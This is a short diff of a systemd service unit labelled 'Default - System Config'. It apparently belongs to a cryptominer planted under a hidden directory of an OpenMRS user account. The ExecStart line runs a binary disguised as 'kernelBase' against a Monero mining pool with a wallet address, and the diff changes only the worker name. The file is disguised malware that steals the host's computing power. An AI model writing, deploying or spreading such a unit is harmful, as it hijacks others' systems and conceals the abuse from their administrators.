@@ -3,7 +3,7 @@ Description="Default - System Config"
 
 [Service]
 WorkingDirectory=/home/openmrs/.gnu
-ExecStart=/home/openmrs/.gnu/kernelBase -o de.monero.herominers.com:1111 -u 4G2VHCK4o1PRcKnLApZuPERbMBgHsCfHWeQFY1D4kPgxQnM9bUbKDoRV9HiUXMKDzQhnG4YfkN57RiZa7LvRCJbzGmMjXmpYwkuKaAHfXD.style0Service -p x
+ExecStart=/home/openmrs/.gnu/kernelBase -o de.monero.herominers.com:1111 -u 4G2VHCK4o1PRcKnLApZuPERbMBgHsCfHWeQFY1D4kPgxQnM9bUbKDoRV9HiUXMKDzQhnG4YfkN57RiZa7LvRCJbzGmMjXmpYwkuKaAHfXD.another -p x
 StandardOutput=file:/var/log/denef.log
 StandardOutput=file:/var/log/denefbugs.log
 
